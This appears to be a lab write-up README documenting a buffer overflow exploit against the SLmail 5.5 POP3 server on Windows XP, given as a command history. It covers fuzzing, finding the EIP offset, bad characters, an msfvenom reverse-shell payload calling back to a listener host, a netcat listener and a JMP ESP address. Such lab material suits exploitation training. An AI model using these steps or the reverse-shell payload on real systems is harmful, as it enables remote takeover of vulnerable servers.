# Buffer overflow on POP3 Mail Server

## Requirements used

- [SLmail v5.5.0.4433 (Vulnerable app)](https://mega.nz/file/HphHnSAA#z9b-tQmLFp52w52SdVV6noEtsFJLDpQ5QtNjzkPJr7c)
- [Immunity Debugger 1.85](https://mega.nz/file/W0oXwQhS#K-AbSqvedRNUsxc99SFpzcyrwpjiSbHurXuDofpGoDw)
- [Mona](https://github.com/corelan/mona)
- Windows XP SP3
- Kali Linux 2021

## History of commands on Bash

```bash
# Scan for open ports and detect version
nmap -v -sV 192.168.1.4

# Script for test connection do POP3 Server
python3 test-service.py

# Fuzzing when SLMail process is attached to Immunity Debugger
python3 fuzzing.py
# -- Access violation with 2700 bytes

# Create a pattern for locate EIP register dump
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700

# Run scsript with pattern
python3 crash-v1.py
# -- Access violation with EIP in 39694438

# Query offset in pattern that reach EIP
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39694438
# -- match at offset 2606

# Test if EIP is reached
python3 crash-v2.py
# -- Access violation with EIP in 04030201
# -- ESP register was filled with 'C' bytes

# Test if ESP can filled with 390 bytes for payload
python3 crash-v3.py

# Script to find bad char
python3 badchar.py

# Create a payload of shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=9000 -b "\x00\x0a\x0d\x20" -f python

# Run netcat and exploit in two terminals
nc -vnlp 9000
python3 exploit.py
```

## History on commands on Immunity Debugger

```bash
# Show infos about modules
!mona modules

# Find instruction JMP ESP (\xff\xe4) on module dll
!mona find -s "\xff\xe4" -m slmfc.dll
# -- One of addresses is: 5F4A358F
```

## References

- [Buffer Overflow para pentesters by Ricardo Longatto](https://www.youtube.com/watch?v=59_gjX2HxyA)
- [Bad char generator](https://github.com/cytopia/badchars)